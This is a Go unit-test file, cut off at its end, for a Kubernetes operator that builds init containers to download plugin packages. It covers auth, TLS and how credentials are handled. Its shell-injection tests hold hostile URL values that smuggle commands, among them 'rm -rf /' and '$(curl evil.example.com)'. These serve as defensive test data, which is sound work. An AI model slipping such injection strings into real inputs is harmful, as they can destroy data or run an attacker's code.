package controller

import (
	"strings"
	"testing"

	corev1 "k8s.io/api/core/v1"

	v1alpha1 "github.com/curityio/curity-operator/api/v1alpha1"
)

// onePackage builds a minimal valid PackageSpec for tests.
func onePackage(url, mountPath string) v1alpha1.PackageSpec {
	return v1alpha1.PackageSpec{
		Source:    v1alpha1.PackageSource{URL: url},
		MountPath: mountPath,
	}
}

// U1: buildPackageVolumes returns one emptyDir volume per package.
func TestBuildPackageVolumes_OneVolumePerPackage(t *testing.T) {
	pkgs := []v1alpha1.PackageSpec{
		onePackage("https://a.example/x.zip", "/etc/plugins/a"),
		onePackage("https://b.example/y.zip", "/etc/plugins/b"),
		onePackage("https://c.example/z.zip", "/etc/plugins/c"),
	}
	volumes := buildPackageVolumes(pkgs)
	if len(volumes) != 3 {
		t.Fatalf("expected 3 volumes (one per package, none have TLS), got %d", len(volumes))
	}
	for i, v := range volumes {
		want := packageVolumeName(i)
		if v.Name != want {
			t.Errorf("volume[%d].Name = %q, want %q", i, v.Name, want)
		}
		if v.EmptyDir == nil {
			t.Errorf("volume[%d] is not emptyDir", i)
		}
		if v.EmptyDir.Medium == corev1.StorageMediumMemory {
			t.Errorf("volume[%d] uses Memory medium; expected default node ephemeral storage", i)
		}
		if v.EmptyDir.SizeLimit == nil {
			t.Errorf("volume[%d] missing sizeLimit", i)
		}
	}
}

// U2: buildPackageVolumeMounts returns one mount per package at MountPath.
func TestBuildPackageVolumeMounts_OneMountPerPackage(t *testing.T) {
	pkgs := []v1alpha1.PackageSpec{
		onePackage("https://a.example/x.zip", "/etc/plugins/a"),
		onePackage("https://b.example/y.zip", "/etc/plugins/b"),
	}
	mounts := buildPackageVolumeMounts(pkgs)
	if len(mounts) != 2 {
		t.Fatalf("expected 2 mounts, got %d", len(mounts))
	}
	for i, m := range mounts {
		if m.MountPath != pkgs[i].MountPath {
			t.Errorf("mount[%d].MountPath = %q, want %q", i, m.MountPath, pkgs[i].MountPath)
		}
		if m.Name != packageVolumeName(i) {
			t.Errorf("mount[%d].Name = %q, want %q", i, m.Name, packageVolumeName(i))
		}
	}
}

// U3: buildPackageInitContainers produces deterministic per-index names.
func TestBuildPackageInitContainers_Names(t *testing.T) {
	pkgs := []v1alpha1.PackageSpec{
		onePackage("https://a.example/x.zip", "/p/a"),
		onePackage("https://b.example/y.zip", "/p/b"),
	}
	cs := buildPackageInitContainers(pkgs, DefaultPackageFetcherImage)
	if got, want := len(cs), 2; got != want {
		t.Fatalf("init container count = %d, want %d", got, want)
	}
	if cs[0].Name != "package-fetch-0" || cs[1].Name != "package-fetch-1" {
		t.Errorf("init container names = [%s, %s], want [package-fetch-0, package-fetch-1]",
			cs[0].Name, cs[1].Name)
	}
}

// U4: init containers use the operator-level fetcher image.
func TestBuildPackageInitContainers_DefaultImage(t *testing.T) {
	pkgs := []v1alpha1.PackageSpec{onePackage("https://a.example/x.zip", "/p/a")}
	cs := buildPackageInitContainers(pkgs, DefaultPackageFetcherImage)
	if got, want := cs[0].Image, DefaultPackageFetcherImage; got != want {
		t.Errorf("init container image = %q, want %q", got, want)
	}
}

// U5: init container runs as root (UID 0). apk add requires root.
func TestBuildPackageInitContainers_RunsAsRoot(t *testing.T) {
	pkgs := []v1alpha1.PackageSpec{onePackage("https://a.example/x.zip", "/p/a")}
	cs := buildPackageInitContainers(pkgs, DefaultPackageFetcherImage)
	sc := cs[0].SecurityContext
	if sc == nil || sc.RunAsUser == nil {
		t.Fatal("init container has no SecurityContext.RunAsUser; required for apk add")
	}
	if *sc.RunAsUser != 0 {
		t.Errorf("RunAsUser = %d, want 0 (root)", *sc.RunAsUser)
	}
}

// U6: bearer token is projected as BEARER_TOKEN env var.
func TestBuildPackageInitContainers_BearerTokenEnv(t *testing.T) {
	p := onePackage("https://a.example/x.zip", "/p/a")
	p.Source.Auth = &v1alpha1.PackageAuthSpec{
		BearerToken: &v1alpha1.PackageSecretKeyRef{
			SecretRef: v1alpha1.PackageSecretKeySelector{Name: "ts", Key: "token"},
		},
	}
	cs := buildPackageInitContainers([]v1alpha1.PackageSpec{p}, DefaultPackageFetcherImage)
	envs := cs[0].Env
	var found bool
	for _, e := range envs {
		if e.Name != "BEARER_TOKEN" {
			continue
		}
		found = true
		if e.ValueFrom == nil || e.ValueFrom.SecretKeyRef == nil {
			t.Fatal("BEARER_TOKEN env var has no secretKeyRef")
		}
		if e.ValueFrom.SecretKeyRef.Name != "ts" || e.ValueFrom.SecretKeyRef.Key != "token" {
			t.Errorf("BEARER_TOKEN secretKeyRef = %v, want {ts, token}", e.ValueFrom.SecretKeyRef)
		}
	}
	if !found {
		t.Error("BEARER_TOKEN env var not projected")
	}
	// Script must consume via stdin (--header @-), not via curl -H argv.
	script := cs[0].Args[0]
	if !strings.Contains(script, "--header @-") {
		t.Error("script does not use stdin (--header @-) for bearer token; credentials may leak via argv")
	}
	if strings.Contains(script, "-H \"Authorization") {
		t.Error("script puts Authorization header on curl argv; credentials may leak via /proc/<pid>/cmdline")
	}
}

// U7: basic auth projects two env vars and consumes them via netrc.
func TestBuildPackageInitContainers_BasicAuthEnv(t *testing.T) {
	p := onePackage("https://a.example/x.zip", "/p/a")
	p.Source.Auth = &v1alpha1.PackageAuthSpec{
		BasicAuth: &v1alpha1.PackageBasicAuthRef{
			SecretRef: v1alpha1.PackageBasicAuthSelector{
				Name: "bs", UsernameKey: "u", PasswordKey: "p",
			},
		},
	}
	cs := buildPackageInitContainers([]v1alpha1.PackageSpec{p}, DefaultPackageFetcherImage)
	gotUser, gotPass := false, false
	for _, e := range cs[0].Env {
		switch e.Name {
		case "BASIC_AUTH_USER":
			gotUser = true
			if e.ValueFrom.SecretKeyRef.Key != "u" {
				t.Errorf("BASIC_AUTH_USER reads key %q, want %q", e.ValueFrom.SecretKeyRef.Key, "u")
			}
		case "BASIC_AUTH_PASS":
			gotPass = true
			if e.ValueFrom.SecretKeyRef.Key != "p" {
				t.Errorf("BASIC_AUTH_PASS reads key %q, want %q", e.ValueFrom.SecretKeyRef.Key, "p")
			}
		}
	}
	if !gotUser || !gotPass {
		t.Errorf("expected both BASIC_AUTH_USER and BASIC_AUTH_PASS env vars; got user=%v pass=%v", gotUser, gotPass)
	}
	script := cs[0].Args[0]
	if !strings.Contains(script, "--netrc-file") {
		t.Error("script does not use --netrc-file for basic auth; credentials may leak via argv")
	}
	if strings.Contains(script, "-u \"") {
		t.Error("script uses curl -u with credentials on argv")
	}
}

// U8: TLS CA Secret projection mounts at /tls/ca.crt and adds --cacert.
func TestBuildPackageInitContainers_TLSCAMount(t *testing.T) {
	p := onePackage("https://a.example/x.zip", "/p/a")
	p.Source.TLS = &v1alpha1.PackageTLSSpec{
		Enabled: true,
		CA: &v1alpha1.PackageSecretKeyRef{
			SecretRef: v1alpha1.PackageSecretKeySelector{Name: "ca-secret", Key: "ca.crt"},
		},
	}
	volumes := buildPackageVolumes([]v1alpha1.PackageSpec{p})
	// Expect the emptyDir + the TLS projection.
	if len(volumes) != 2 {
		t.Fatalf("expected 2 volumes (emptyDir + tls), got %d", len(volumes))
	}
	tlsVol := volumes[1]
	if tlsVol.Name != packageTLSVolumeName(0) {
		t.Errorf("TLS volume name = %q, want %q", tlsVol.Name, packageTLSVolumeName(0))
	}
	if tlsVol.Projected == nil || len(tlsVol.Projected.Sources) != 1 {
		t.Fatalf("expected 1 projected source (CA only), got %+v", tlsVol.Projected)
	}
	cs := buildPackageInitContainers([]v1alpha1.PackageSpec{p}, DefaultPackageFetcherImage)
	script := cs[0].Args[0]
	if !strings.Contains(script, "--cacert /tls/ca.crt") {
		t.Errorf("script missing --cacert /tls/ca.crt:\n%s", script)
	}
}

// U9: TLS clientCert mounts both tls.crt and tls.key with derived key name.
func TestBuildPackageInitContainers_TLSClientCertMount(t *testing.T) {
	p := onePackage("https://a.example/x.zip", "/p/a")
	p.Source.TLS = &v1alpha1.PackageTLSSpec{
		Enabled: true,
		ClientCert: &v1alpha1.PackageClientCertRef{
			SecretRef: v1alpha1.PackageClientCertSelector{Name: "mtls", Key: "tls.crt"},
		},
	}
	volumes := buildPackageVolumes([]v1alpha1.PackageSpec{p})
	if len(volumes) != 2 {
		t.Fatalf("expected 2 volumes, got %d", len(volumes))
	}
	src := volumes[1].Projected.Sources[0].Secret
	if src.Name != "mtls" {
		t.Errorf("clientCert secret name = %q, want %q", src.Name, "mtls")
	}
	if len(src.Items) != 2 {
		t.Fatalf("expected 2 items (tls.crt + tls.key), got %d", len(src.Items))
	}
	if src.Items[0].Path != "tls.crt" || src.Items[0].Key != "tls.crt" {
		t.Errorf("clientCert items[0] = %+v, want {Key: tls.crt, Path: tls.crt}", src.Items[0])
	}
	if src.Items[1].Path != "tls.key" || src.Items[1].Key != "tls.key" {
		t.Errorf("clientCert items[1] = %+v, want {Key: tls.key, Path: tls.key}", src.Items[1])
	}
	cs := buildPackageInitContainers([]v1alpha1.PackageSpec{p}, DefaultPackageFetcherImage)
	script := cs[0].Args[0]
	if !strings.Contains(script, "--cert /tls/tls.crt") || !strings.Contains(script, "--key /tls/tls.key") {
		t.Errorf("script missing mTLS flags:\n%s", script)
	}
}

// U10: skipVerify=true emits -k and ignores --cacert even when CA is set.
func TestBuildPackageInitContainers_SkipVerify(t *testing.T) {
	p := onePackage("https://a.example/x.zip", "/p/a")
	p.Source.TLS = &v1alpha1.PackageTLSSpec{
		Enabled:    true,
		SkipVerify: true,
		CA: &v1alpha1.PackageSecretKeyRef{
			SecretRef: v1alpha1.PackageSecretKeySelector{Name: "ca", Key: "ca.crt"},
		},
	}
	cs := buildPackageInitContainers([]v1alpha1.PackageSpec{p}, DefaultPackageFetcherImage)
	script := cs[0].Args[0]
	if !strings.Contains(script, " -k") {
		t.Errorf("script missing -k for skipVerify:\n%s", script)
	}
	if strings.Contains(script, "--cacert") {
		t.Errorf("script has --cacert despite skipVerify=true:\n%s", script)
	}
}

// U10b: tls.enabled=false ignores the rest of the TLS block (per proposal).
func TestBuildPackageInitContainers_TLSDisabled(t *testing.T) {
	p := onePackage("https://a.example/x.zip", "/p/a")
	p.Source.TLS = &v1alpha1.PackageTLSSpec{
		Enabled:    false, // gate closed
		SkipVerify: true,
		CA: &v1alpha1.PackageSecretKeyRef{
			SecretRef: v1alpha1.PackageSecretKeySelector{Name: "ca", Key: "ca.crt"},
		},
	}
	cs := buildPackageInitContainers([]v1alpha1.PackageSpec{p}, DefaultPackageFetcherImage)
	script := cs[0].Args[0]
	if strings.Contains(script, "-k") || strings.Contains(script, "--cacert") {
		t.Errorf("tls.enabled=false should produce no TLS flags, got:\n%s", script)
	}
	volumes := buildPackageVolumes([]v1alpha1.PackageSpec{p})
	if len(volumes) != 1 {
		t.Errorf("tls.enabled=false should produce no TLS projected volume; got %d volumes", len(volumes))
	}
}

// U11: computePackagesHash is deterministic.
func TestComputePackagesHash_Deterministic(t *testing.T) {
	pkgs := []v1alpha1.PackageSpec{
		onePackage("https://a.example/x.zip", "/p/a"),
		onePackage("https://b.example/y.zip", "/p/b"),
	}
	if a, b := computePackagesHash(pkgs), computePackagesHash(pkgs); a != b {
		t.Errorf("hash differs across calls: %q vs %q", a, b)
	}
}

// U13: hash changes when URL changes.
func TestComputePackagesHash_URLChange(t *testing.T) {
	a := []v1alpha1.PackageSpec{onePackage("https://a.example/x.zip", "/p/a")}
	b := []v1alpha1.PackageSpec{onePackage("https://b.example/x.zip", "/p/a")}
	if computePackagesHash(a) == computePackagesHash(b) {
		t.Error("hash should differ when URL changes")
	}
}

// U14: hash changes when Secret ref changes.
func TestComputePackagesHash_SecretRefChange(t *testing.T) {
	mk := func(name string) []v1alpha1.PackageSpec {
		p := onePackage("https://a.example/x.zip", "/p/a")
		p.Source.Auth = &v1alpha1.PackageAuthSpec{
			BearerToken: &v1alpha1.PackageSecretKeyRef{
				SecretRef: v1alpha1.PackageSecretKeySelector{Name: name, Key: "token"},
			},
		}
		return []v1alpha1.PackageSpec{p}
	}
	if computePackagesHash(mk("ts1")) == computePackagesHash(mk("ts2")) {
		t.Error("hash should differ when Secret ref name changes")
	}
}

// U16: reordering packages changes the hash (order is significant).
func TestComputePackagesHash_OrderSignificant(t *testing.T) {
	a := onePackage("https://a.example/x.zip", "/p/a")
	b := onePackage("https://b.example/y.zip", "/p/b")
	h1 := computePackagesHash([]v1alpha1.PackageSpec{a, b})
	h2 := computePackagesHash([]v1alpha1.PackageSpec{b, a})
	if h1 == h2 {
		t.Error("hash should differ when package order changes (init containers run in array order)")
	}
}

// U17/U18: nil and empty slice both return "".
func TestComputePackagesHash_NilAndEmpty(t *testing.T) {
	if h := computePackagesHash(nil); h != "" {
		t.Errorf("computePackagesHash(nil) = %q, want \"\"", h)
	}
	if h := computePackagesHash([]v1alpha1.PackageSpec{}); h != "" {
		t.Errorf("computePackagesHash([]) = %q, want \"\"", h)
	}
}

// U19: nil input produces no init containers, no volumes, no mounts.
func TestPackageBuilders_NilInput(t *testing.T) {
	if v := buildPackageVolumes(nil); len(v) != 0 {
		t.Errorf("buildPackageVolumes(nil) = %d volumes, want 0", len(v))
	}
	if m := buildPackageVolumeMounts(nil); len(m) != 0 {
		t.Errorf("buildPackageVolumeMounts(nil) = %d mounts, want 0", len(m))
	}
	if c := buildPackageInitContainers(nil, DefaultPackageFetcherImage); len(c) != 0 {
		t.Errorf("buildPackageInitContainers(nil, DefaultPackageFetcherImage) = %d containers, want 0", len(c))
	}
}

// U28: 20 packages produce 20 init containers, mounts, and emptyDir volumes
// (20 is the CRD MaxItems).
func TestPackageBuilders_MaxItems(t *testing.T) {
	pkgs := make([]v1alpha1.PackageSpec, 20)
	for i := range pkgs {
		pkgs[i] = onePackage("https://a.example/x.zip", "/p/"+string(rune('a'+i)))
	}
	if got, want := len(buildPackageVolumes(pkgs)), 20; got != want {
		t.Errorf("volumes = %d, want %d", got, want)
	}
	if got, want := len(buildPackageVolumeMounts(pkgs)), 20; got != want {
		t.Errorf("mounts = %d, want %d", got, want)
	}
	if got, want := len(buildPackageInitContainers(pkgs, DefaultPackageFetcherImage)), 20; got != want {
		t.Errorf("init containers = %d, want %d", got, want)
	}
}

// U30: package with neither auth nor TLS produces a clean curl invocation.
func TestBuildPackageDownloadScript_PlainHTTPS(t *testing.T) {
	script := buildPackageDownloadScript(onePackage("https://a.example/x.zip", "/p/a"), 0)
	if strings.Contains(script, "-u ") || strings.Contains(script, "Authorization") {
		t.Errorf("plain script contains auth flags:\n%s", script)
	}
	if strings.Contains(script, "--cacert") || strings.Contains(script, "--cert") || strings.Contains(script, " -k") {
		t.Errorf("plain script contains TLS flags:\n%s", script)
	}
	// Must follow redirects (-L) — GitHub archive URLs return 302.
	if !strings.Contains(script, "-fsSL") {
		t.Errorf("script missing -L flag (-fsSL); GitHub redirects will fail:\n%s", script)
	}
	// Hard size cap.
	if !strings.Contains(script, "--max-filesize 268435456") {
		t.Errorf("script missing --max-filesize cap:\n%s", script)
	}
	// apk add for tools.
	if !strings.Contains(script, "apk add --no-cache curl unzip ca-certificates") {
		t.Errorf("script missing apk add line:\n%s", script)
	}
	// unzip step.
	if !strings.Contains(script, "unzip -q /tmp/pkg.zip -d /pkg") {
		t.Errorf("script missing unzip step:\n%s", script)
	}
}

// Diagnostic: apk add must NOT redirect stderr to /dev/null. If Alpine
// repos are unreachable (NetworkPolicy / air-gap / DNS hiccup) the failure
// reason should surface in `kubectl logs <pod> -c package-fetch-N` rather
// than disappearing into a silent Init:Error.
func TestBuildPackageDownloadScript_ApkErrorsLeakToStderr(t *testing.T) {
	script := buildPackageDownloadScript(onePackage("https://a.example/x.zip", "/p/a"), 0)
	for _, bad := range []string{
		"apk add --no-cache curl unzip ca-certificates >/dev/null 2>&1",
		"apk add --no-cache curl unzip ca-certificates 2>/dev/null",
		"apk add --no-cache curl unzip ca-certificates 2>&1",
	} {
		if strings.Contains(script, bad) {
			t.Errorf("script suppresses apk stderr (%q); real failures will be invisible:\n%s", bad, script)
		}
	}
	// Sanity: progress (stdout) IS suppressed.
	if !strings.Contains(script, "apk add --no-cache curl unzip ca-certificates >/dev/null\n") {
		t.Errorf("script does not redirect apk stdout to /dev/null:\n%s", script)
	}
}

// derivePrivateKeyKey: regression on the cert→key derivation rule.
func TestDerivePrivateKeyKey(t *testing.T) {
	cases := []struct{ cert, want string }{
		{"tls.crt", "tls.key"},
		{"client.crt", "client.key"},
		{"server.crt", "server.key"},
		{"weird-name", "tls.key"}, // fallback when no "crt" suffix
	}
	for _, c := range cases {
		if got := derivePrivateKeyKey(c.cert); got != c.want {
			t.Errorf("derivePrivateKeyKey(%q) = %q, want %q", c.cert, got, c.want)
		}
	}
}

// ResolvePackageFetcherImage honors PACKAGE_FETCHER_IMAGE env var override.
// Called once at controller construction; the resolved value is stored on
// IdentityServerNodeReconciler.PackageFetcherImage so reconciles never
// re-read process env.
func TestResolvePackageFetcherImage_EnvOverride(t *testing.T) {
	t.Setenv(EnvPackageFetcherImage, "private.io/mirror/alpine:3.19")
	if got := ResolvePackageFetcherImage(); got != "private.io/mirror/alpine:3.19" {
		t.Errorf("ResolvePackageFetcherImage() with override = %q, want %q",
			got, "private.io/mirror/alpine:3.19")
	}
}

func TestResolvePackageFetcherImage_Default(t *testing.T) {
	t.Setenv(EnvPackageFetcherImage, "")
	if got := ResolvePackageFetcherImage(); got != DefaultPackageFetcherImage {
		t.Errorf("ResolvePackageFetcherImage() default = %q, want %q",
			got, DefaultPackageFetcherImage)
	}
}

// The reconciler stores the resolved image on its struct, NOT a global.
// This guards against future regressions where someone reintroduces
// per-reconcile env reads.
func TestIdentityServerNodeReconciler_PackageFetcherImageField(t *testing.T) {
	r := &IdentityServerNodeReconciler{
		PackageFetcherImage: "custom.io/fetcher:1.0",
	}
	if r.PackageFetcherImage != "custom.io/fetcher:1.0" {
		t.Errorf("reconciler.PackageFetcherImage = %q, want %q",
			r.PackageFetcherImage, "custom.io/fetcher:1.0")
	}
}

// Regression-guard R1: a cluster with no packages produces zero init
// containers and no curity.io/packages-hash annotation.
func TestBuildDeployment_NoPackages_NoInitContainers(t *testing.T) {
	cluster := newTestCluster()
	node := newTestNode(v1alpha1.NodeTypeRuntime)
	deploy := buildDeployment(cluster, node, nil, DefaultPackageFetcherImage)
	if len(deploy.Spec.Template.Spec.InitContainers) != 0 {
		t.Errorf("expected 0 init containers when packages empty, got %d",
			len(deploy.Spec.Template.Spec.InitContainers))
	}
	for _, v := range deploy.Spec.Template.Spec.Volumes {
		if strings.HasPrefix(v.Name, "pkg-") {
			t.Errorf("unexpected pkg volume %q when packages empty", v.Name)
		}
	}
}

// Regression-guard: with packages, the Deployment has the expected
// init containers and volume mounts on the main container.
func TestBuildDeployment_WithPackages(t *testing.T) {
	cluster := newTestCluster()
	cluster.Spec.Packages = []v1alpha1.PackageSpec{
		onePackage("https://a.example/x.zip", "/etc/plugins/a"),
		onePackage("https://b.example/y.zip", "/etc/plugins/b"),
	}
	node := newTestNode(v1alpha1.NodeTypeRuntime)
	deploy := buildDeployment(cluster, node, nil, DefaultPackageFetcherImage)

	initContainers := deploy.Spec.Template.Spec.InitContainers
	if len(initContainers) != 2 {
		t.Fatalf("expected 2 init containers, got %d", len(initContainers))
	}
	if initContainers[0].Name != "package-fetch-0" || initContainers[1].Name != "package-fetch-1" {
		t.Errorf("init container names = [%s, %s], want [package-fetch-0, package-fetch-1]",
			initContainers[0].Name, initContainers[1].Name)
	}

	// Main container should have both /etc/plugins/a and /etc/plugins/b mounts.
	mounts := deploy.Spec.Template.Spec.Containers[0].VolumeMounts
	gotA, gotB := false, false
	for _, m := range mounts {
		if m.MountPath == "/etc/plugins/a" {
			gotA = true
		}
		if m.MountPath == "/etc/plugins/b" {
			gotB = true
		}
	}
	if !gotA || !gotB {
		t.Errorf("expected mounts at both package paths; got a=%v b=%v\nmounts=%+v", gotA, gotB, mounts)
	}

	// Volume names pkg-0, pkg-1 should both exist.
	gotV0, gotV1 := false, false
	for _, v := range deploy.Spec.Template.Spec.Volumes {
		if v.Name == "pkg-0" {
			gotV0 = true
		}
		if v.Name == "pkg-1" {
			gotV1 = true
		}
	}
	if !gotV0 || !gotV1 {
		t.Errorf("expected pkg-0 and pkg-1 volumes; got v0=%v v1=%v", gotV0, gotV1)
	}
}

// Make sure the volume is *only* attached when at least one of CA / clientCert
// is set; an enabled-but-empty TLS block produces no projected volume.
func TestBuildPackageTLSVolume_EnabledButEmpty(t *testing.T) {
	p := onePackage("https://a.example/x.zip", "/p/a")
	p.Source.TLS = &v1alpha1.PackageTLSSpec{Enabled: true}
	if v := buildPackageTLSVolume(p, 0); v != nil {
		t.Errorf("expected nil volume for enabled-but-empty TLS, got %+v", v)
	}
}

// init container's VolumeMounts include /pkg always and /tls only when TLS
// is enabled with refs.
func TestBuildPackageInitVolumeMounts(t *testing.T) {
	p := onePackage("https://a.example/x.zip", "/p/a")
	if got := buildPackageInitVolumeMounts(p, 0); len(got) != 1 || got[0].MountPath != "/pkg" {
		t.Errorf("plain init mounts = %+v, want one /pkg mount", got)
	}
	p.Source.TLS = &v1alpha1.PackageTLSSpec{
		Enabled: true,
		CA: &v1alpha1.PackageSecretKeyRef{
			SecretRef: v1alpha1.PackageSecretKeySelector{Name: "ca", Key: "ca.crt"},
		},
	}
	got := buildPackageInitVolumeMounts(p, 0)
	if len(got) != 2 {
		t.Fatalf("with TLS: mounts count = %d, want 2", len(got))
	}
	if got[1].MountPath != "/tls" || !got[1].ReadOnly {
		t.Errorf("expected /tls readonly mount, got %+v", got[1])
	}
}

// Ensure no stray Authorization argv anywhere in any of the script variants.
func TestBuildPackageDownloadScript_NoAuthInArgv(t *testing.T) {
	cases := []v1alpha1.PackageSpec{
		// bearer
		func() v1alpha1.PackageSpec {
			p := onePackage("https://a.example/x.zip", "/p/a")
			p.Source.Auth = &v1alpha1.PackageAuthSpec{
				BearerToken: &v1alpha1.PackageSecretKeyRef{
					SecretRef: v1alpha1.PackageSecretKeySelector{Name: "ts", Key: "token"},
				},
			}
			return p
		}(),
		// basic
		func() v1alpha1.PackageSpec {
			p := onePackage("https://a.example/x.zip", "/p/a")
			p.Source.Auth = &v1alpha1.PackageAuthSpec{
				BasicAuth: &v1alpha1.PackageBasicAuthRef{
					SecretRef: v1alpha1.PackageBasicAuthSelector{
						Name: "bs", UsernameKey: "u", PasswordKey: "p",
					},
				},
			}
			return p
		}(),
	}
	for i, p := range cases {
		script := buildPackageDownloadScript(p, 0)
		// argv anti-patterns
		bad := []string{
			" -u $",   // curl -u with creds
			" -u \"$", // curl -u with creds in quotes
			" -H \"Authorization",
		}
		for _, b := range bad {
			if strings.Contains(script, b) {
				t.Errorf("case %d: script contains %q (credential leak via argv):\n%s", i, b, script)
			}
		}
	}
}

// PKG_URL env var is set even when no auth is configured (the script
// reads "$PKG_URL" instead of an inlined URL string, to prevent shell
// injection on URLs containing metacharacters).
func TestBuildPackageInitEnv_PkgURLAlwaysSet(t *testing.T) {
	envs := buildPackageInitEnv(onePackage("https://a.example/x.zip", "/p/a"))
	if len(envs) != 1 {
		t.Fatalf("expected exactly 1 env var (PKG_URL) when no auth, got %d: %+v", len(envs), envs)
	}
	if envs[0].Name != "PKG_URL" || envs[0].Value != "https://a.example/x.zip" {
		t.Errorf("PKG_URL env var = %+v, want {Name: PKG_URL, Value: https://a.example/x.zip}", envs[0])
	}
	if envs[0].ValueFrom != nil {
		t.Errorf("PKG_URL must use Value (not ValueFrom); got ValueFrom = %+v", envs[0].ValueFrom)
	}
}

// Sanity: package volumes don't collide with the cluster-config volume.
func TestBuildDeployment_NoVolumeNameCollisions(t *testing.T) {
	cluster := newTestCluster()
	cluster.Spec.Packages = []v1alpha1.PackageSpec{
		onePackage("https://a.example/x.zip", "/etc/plugins/a"),
	}
	node := newTestNode(v1alpha1.NodeTypeRuntime)
	deploy := buildDeployment(cluster, node, nil, DefaultPackageFetcherImage)
	seen := make(map[string]bool)
	for _, v := range deploy.Spec.Template.Spec.Volumes {
		if seen[v.Name] {
			t.Errorf("duplicate volume name: %q", v.Name)
		}
		seen[v.Name] = true
	}
}

// Each VolumeMount on the main container has a matching volume by name.
func TestBuildDeployment_PackageMountsHaveVolumes(t *testing.T) {
	cluster := newTestCluster()
	cluster.Spec.Packages = []v1alpha1.PackageSpec{
		onePackage("https://a.example/x.zip", "/etc/plugins/a"),
		onePackage("https://b.example/y.zip", "/etc/plugins/b"),
	}
	node := newTestNode(v1alpha1.NodeTypeRuntime)
	deploy := buildDeployment(cluster, node, nil, DefaultPackageFetcherImage)
	volNames := make(map[string]bool)
	for _, v := range deploy.Spec.Template.Spec.Volumes {
		volNames[v.Name] = true
	}
	for _, m := range deploy.Spec.Template.Spec.Containers[0].VolumeMounts {
		if strings.HasPrefix(m.Name, "pkg-") && !volNames[m.Name] {
			t.Errorf("VolumeMount references missing volume %q", m.Name)
		}
	}
}

// Test that init container's /pkg mount writes to the same volume that the
// main container reads — by name.
func TestBuildDeployment_InitAndMainShareVolume(t *testing.T) {
	cluster := newTestCluster()
	cluster.Spec.Packages = []v1alpha1.PackageSpec{
		onePackage("https://a.example/x.zip", "/etc/plugins/a"),
	}
	node := newTestNode(v1alpha1.NodeTypeRuntime)
	deploy := buildDeployment(cluster, node, nil, DefaultPackageFetcherImage)
	init := deploy.Spec.Template.Spec.InitContainers[0]
	var initVol string
	for _, m := range init.VolumeMounts {
		if m.MountPath == "/pkg" {
			initVol = m.Name
		}
	}
	if initVol == "" {
		t.Fatal("init container missing /pkg mount")
	}
	var mainVol string
	for _, m := range deploy.Spec.Template.Spec.Containers[0].VolumeMounts {
		if m.MountPath == "/etc/plugins/a" {
			mainVol = m.Name
		}
	}
	if initVol != mainVol {
		t.Errorf("init writes to volume %q but main reads %q — files won't be visible", initVol, mainVol)
	}
}

// Type assertion guard so refactors that rename projected source fields
// don't silently break the TLS volume.
func TestBuildPackageTLSVolume_ShapeIsProjectedSecret(t *testing.T) {
	p := onePackage("https://a.example/x.zip", "/p/a")
	p.Source.TLS = &v1alpha1.PackageTLSSpec{
		Enabled: true,
		CA:      &v1alpha1.PackageSecretKeyRef{SecretRef: v1alpha1.PackageSecretKeySelector{Name: "ca", Key: "ca.crt"}},
	}
	v := buildPackageTLSVolume(p, 0)
	if v == nil {
		t.Fatal("expected non-nil volume")
	}
	if v.Projected == nil {
		t.Fatal("expected Projected volume source")
	}
	if v.Projected.DefaultMode == nil || *v.Projected.DefaultMode != 0o400 {
		t.Errorf("expected DefaultMode 0400 (read-only owner), got %v", v.Projected.DefaultMode)
	}
	if len(v.Projected.Sources) == 0 || v.Projected.Sources[0].Secret == nil {
		t.Fatal("expected at least one Secret projection source")
	}
}

// Fast smoke: hash of a single package is non-empty and 64 hex chars
// (full SHA-256). Matches the cluster-config-hash convention so both
// rolling-restart-trigger annotations have the same shape.
func TestComputePackagesHash_FormatLength(t *testing.T) {
	h := computePackagesHash([]v1alpha1.PackageSpec{
		onePackage("https://a.example/x.zip", "/p/a"),
	})
	if len(h) != 64 {
		t.Errorf("hash length = %d, want 64 (hex of full SHA-256)", len(h))
	}
}

// Sanity: env vars carrying SECRET material use SecretKeySelector and not
// literal values. Non-secret values (PKG_URL, PKG_HOST) are allowed to
// use Value since they come from spec, not from a Secret.
func TestBuildPackageInitEnv_SecretMaterialNeverInline(t *testing.T) {
	p := onePackage("https://a.example/x.zip", "/p/a")
	p.Source.Auth = &v1alpha1.PackageAuthSpec{
		BearerToken: &v1alpha1.PackageSecretKeyRef{
			SecretRef: v1alpha1.PackageSecretKeySelector{Name: "ts", Key: "token"},
		},
	}
	secretEnvs := map[string]bool{
		"BEARER_TOKEN":    true,
		"BASIC_AUTH_USER": true,
		"BASIC_AUTH_PASS": true,
	}
	for _, e := range buildPackageInitEnv(p) {
		if !secretEnvs[e.Name] {
			continue
		}
		if e.Value != "" {
			t.Errorf("secret env var %q has literal value %q; expected ValueFrom only", e.Name, e.Value)
		}
		if e.ValueFrom == nil {
			t.Errorf("secret env var %q has no ValueFrom", e.Name)
		}
	}
}

// Security: a URL with shell metacharacters must NOT appear in the
// generated script body. The script must reference "$PKG_URL" instead,
// so the shell expansion is value-preserving (no command injection).
func TestBuildPackageDownloadScript_NoURLShellInjection(t *testing.T) {
	hostile := []string{
		`https://example.com/x.zip"; rm -rf /; #`,
		`https://example.com/x.zip$(curl evil.example.com)`,
		"https://example.com/x.zip`whoami`",
		`https://example.com/x.zip\";echo PWNED;\"`,
		`https://example.com/x.zip#fragment-with-hash`,
		`https://example.com/x.zip%20with%20spaces`,
	}
	for _, u := range hostile {
		t.Run(u, func(t *testing.T) {
			p := onePackage(u, "/p/x")
			script := buildPackageDownloadScript(p, 0)
			if strings.Contains(script, u) {
				t.Errorf("script body contains the literal URL %q; should reference $PKG_URL only:\n%s", u, script)
			}
			if !strings.Contains(script, `"$PKG_URL"`) {
				t.Errorf("script does not reference $PKG_URL via env var:\n%s", script)
			}
		})
	}
}

// Security: a URL with shell metacharacters must still produce the right
// PKG_URL env var value (the value is set by K8s API, not via shell, so
// metacharacters are preserved verbatim).
func TestBuildPackageInitEnv_PkgURLPreservesMetacharacters(t *testing.T) {
	hostile := `https://example.com/x.zip"; rm -rf /; #`
	envs := buildPackageInitEnv(onePackage(hostile, "/p/x"))
	if envs[0].Name != "PKG_URL" || envs[0].Value != hostile {
		t.Errorf("PKG_URL must preserve URL bytes verbatim; got %+v", envs[0])
	}
}

// Security: the netrc construction uses a constant printf format string
// ('%s\n') so Secret bytes can never be parsed as printf format directives.
// The script must NOT use a multi-%s format like
// `printf 'machine %s login %s password %s\n' ...` — that pattern is
// unsafe if a Secret value ever ends up in the format-string position
// after a future refactor (defense in depth).
func TestBuildPackageDownloadScript_NetrcUsesConstantFormat(t *testing.T) {
